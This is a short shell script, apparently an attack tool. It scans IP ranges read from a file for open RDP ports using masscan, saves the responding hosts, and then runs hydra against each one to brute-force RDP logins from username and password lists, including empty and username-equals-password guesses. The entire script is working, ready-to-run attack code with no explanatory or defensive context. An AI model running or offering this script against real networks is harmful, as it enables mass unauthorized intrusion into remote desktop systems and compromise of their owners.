rm -rf results.txt
ranges=$(awk '{match($0, /[0-9]+\.[0-9]+\.[0-9]+\.*[0-9]+\/[0-9]+/); print substr($0, RSTART, RLENGTH)}' $1)
for range in $ranges; do
echo "scanning range "$range" for rdp"
d=$(masscan -p3389 $range)
ips=$(echo $d | sed 's/Discovered /\nDiscovered/g' | awk '{ print $5 }')
[[ ! -z $ips ]] && echo $ips >> results.txt
done
for lin1 in $(cat results.txt); do hydra -L users.txt -P pass.txt -e ns -o Output/rdp_$lin1.txt -I -V -W 3 -t 10 $lin1 rdp ; done
